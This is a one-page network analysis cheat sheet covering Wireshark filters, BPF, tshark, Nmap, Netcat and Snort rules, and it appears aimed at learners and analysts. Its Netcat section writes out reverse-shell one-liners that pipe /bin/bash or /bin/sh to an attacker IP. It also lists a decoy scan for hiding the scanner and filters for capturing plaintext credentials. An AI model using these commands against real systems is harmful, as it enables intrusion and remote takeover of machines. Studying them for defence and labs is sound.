# 🦈 Packet Ninja: Master Cheat Sheet

> **The Ultimate One-Page Reference for Wireshark, Nmap, Netcat, Snort, and Protocol Analysis.**

---

## 1. Protocol Architecture & Header Sizes
| Layer | Protocol | Header Size | Key Field / EtherType / IP Proto |
|---|---|---|---|
| **L2** | Ethernet II | 14 B (+4 B FCS) | `0x0800` IPv4 · `0x0806` ARP · `0x86dd` IPv6 · `0x8100` 802.1Q |
| **L3** | IPv4 | 20 B (up to 60 B) | Protocol: `1` ICMP · `6` TCP · `17` UDP · `47` GRE · `50` ESP |
| **L3** | IPv6 | 40 B (fixed) | Next Header |
| **L4** | TCP | 20 B (up to 60 B) | Flags: `CWR ECE URG ACK PSH RST SYN FIN` (128..1) |
| **L4** | UDP | 8 B (fixed) | Src Port, Dst Port, Length, Checksum |
| **L3** | ICMP | 8 B (fixed) | Type: `0` Echo Reply · `8` Echo Req · `3` Unreachable · `11` Time Exceeded |

---

## 2. Wireshark Display Filters (The Daily Top 25)
```
# IP & Endpoints
ip.addr == 10.10.10.20                 # All traffic to/from host
!(ip.addr == 10.10.10.10)              # Exclude analyst IP
ip.ttl < 10                            # Traceroute or routing loops
arp.duplicate-address-detected         # ARP Spoofing / IP conflict!

# TCP Analysis & Troubleshooting
tcp.flags.syn == 1 && tcp.flags.ack == 0  # Initial connection attempts / Scans
tcp.flags.reset == 1                   # Closed port / connection abort
tcp.analysis.retransmission            # Packet loss
tcp.analysis.duplicate_ack             # Loss / Out-of-order indicator
tcp.analysis.zero_window               # Receiver application buffer is full!
tcp.analysis.window_full               # Sender hit receiver window cap
tcp.time_delta > 1.0                   # Delays over 1 sec in conversation
tcp.stream eq 0                        # Follow specific TCP session

# DNS
dns.flags.rcode != 0                   # DNS resolution errors (3 = NXDOMAIN)
dns.qry.type == 16                     # DNS TXT queries (check for C2 tunneling)

# Web & TLS
http.request.method in {"GET","POST"}  # Web requests
http.response.code >= 400              # Web client/server errors
http.authorization                     # Plaintext Basic Auth credentials
tls.handshake.type == 1                # TLS Client Hello
tls.handshake.extensions_server_name   # SNI target domain

# Plaintext Protocols
ftp.request.command in {"USER","PASS"} # FTP credentials
telnet                                 # Telnet interactive sessions
ssh.protocol                           # SSH cleartext banner exchange
```

---

## 3. BPF (Capture Filters) Quick Reference
```
host 10.10.10.20                       # Inbound & outbound to IP
src net 192.168.0.0/16                 # Source in subnet
port 53                                # TCP or UDP port 53
not port 22                            # Exclude your own SSH session
ether host 08:00:27:aa:bb:cc           # By MAC address
tcp[tcpflags] & tcp-syn != 0           # Any SYN packet
tcp[tcpflags] & (tcp-syn|tcp-ack) == 2 # Initial SYN only (scans)
tcp[13] == 0x29                        # Xmas scan (FIN+PSH+URG)
tcp[13] == 0x00                        # NULL scan (no flags)
icmp[icmptype] == icmp-echo            # Ping requests
```

---

## 4. TShark Power One-Liners
```bash
# Live display filter to terminal
tshark -i eth0 -Y "http.request"

# Extract custom fields to clean CSV
tshark -r cap.pcapng -Y "dns.flags.response==0" \
  -T fields -e ip.src -e dns.qry.name \
  -E header=y -E separator=, > dns_queries.csv

# Extract distinct TLS SNI target domains
tshark -r cap.pcapng -Y "tls.handshake.extensions_server_name" \
  -T fields -e tls.handshake.extensions_server_name | sort -u

# Decrypt TLS on the fly via SSLKEYLOGFILE
tshark -r cap.pcapng -o "tls.keylog_file:/tmp/sslkeys.log" -Y "http"

# Count top talkers
tshark -r cap.pcapng -q -z conv,ip
```

---

## 5. Nmap Scanning Commands
```bash
# Fast ARP discovery sweep on local subnet
nmap -sn 10.10.10.0/24

# Full aggressive scan (Services, OS, Scripts, Traceroute)
sudo nmap -A -p- 10.10.10.20 -oA /path/to/scan_results

# TCP SYN Stealth Scan (Root required)
sudo nmap -sS -p 1-1024 10.10.10.20

# Treat host as online (skip ping)
sudo nmap -Pn 10.10.10.40

# Audit TLS ciphers with NSE
sudo nmap --script ssl-enum-ciphers -p 443 10.10.10.20

# Check for EternalBlue (WannaCry)
sudo nmap --script smb-vuln-ms17-010 -p 445 10.10.10.30

# Decoy scan (obscure real scanner IP)
sudo nmap -D RND:5,ME -sS -p 80 10.10.10.20

# Convert Nmap XML to interactive HTML report
xsltproc scan.xml -o report.html
```

---

## 6. Netcat & Socat Operations
```bash
# Connect to port (Client mode)
nc -vn 10.10.10.20 80

# Spawn a TCP listener (Server mode)
nc -lvnp 4444

# Reverse Shell Listener (Attacker side)
nc -lvnp 4444

# Reverse Shell (Target dials out to Attacker)
nc 10.10.10.10 4444 -e /bin/bash

# Reverse Shell without -e (Unix FIFO pipe)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f

# Encrypted Ncat SSL Listener
ncat -lvnp 8443 --ssl

# Socat TCP Port Forwarder (Proxy)
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.20:80
```

---

## 7. Snort Rules Syntax & Production Templates
```
[action] [proto] [src_ip] [src_port] -> [dst_ip] [dst_port] ( [options]; )
```

```conf
# 1. Detect Inbound Port Scan
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SCAN Inbound TCP Port Scan"; flags:S,12; detection_filter: track by_src, count 20, seconds 5; sid:1000001; rev:1;)

# 2. Detect SQL Injection (UNION SELECT)
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"WEB-ATTACK SQLi UNION SELECT"; flow:to_server,established; http_uri; content:"UNION"; nocase; content:"SELECT"; nocase; sid:1000002; rev:1;)

# 3. Detect Shellshock RCE (CVE-2014-6271)
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"EXPLOIT Bash Shellshock Attempt"; flow:to_server,established; http_header; content:"() {"; sid:1000003; rev:1;)
```

```bash
# Test Snort syntax
sudo snort -T -c /etc/snort/snort.conf -i enp0s3

# Process PCAP offline
sudo snort -r capture.pcap -c /etc/snort/snort.conf -A console -q
```
